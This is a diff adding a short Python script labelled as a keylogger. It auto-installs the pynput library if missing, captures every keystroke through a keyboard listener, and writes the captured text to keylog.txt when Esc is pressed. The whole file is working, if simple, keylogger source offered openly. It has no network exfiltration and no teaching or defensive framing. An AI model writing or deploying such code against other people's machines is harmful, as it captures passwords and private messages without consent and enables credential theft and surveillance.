@@ -1,0 +1,42 @@
+################################KEY LOGGER######################
+import subprocess
+
+# Function to install a Python package using pip
+def install_package(package):
+    try:
+        subprocess.check_call(["python", '-m', 'pip', 'install', package])
+    except Exception as e:
+        print(f"Error installing {package}: {str(e)}")
+
+# Check if the pynput module is installed
+try:
+    import pynput
+except ImportError:
+    print("pynput library not found. Installing...")
+    install_package('pynput')
+    import pynput
+
+# Rest of the keylogger code
+log = ""
+
+def on_press(key):
+    global log
+    try:
+        log += key.char
+    except AttributeError:
+        if key == pynput.keyboard.Key.space:
+            log += " "
+        else:
+            log += f"[{key}]"
+
+def on_release(key):
+    if key == pynput.keyboard.Key.esc:
+        write_log(log)
+        return False
+
+def write_log(log):
+    with open("keylog.txt", "w") as f:
+        f.write(log)
+
+with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
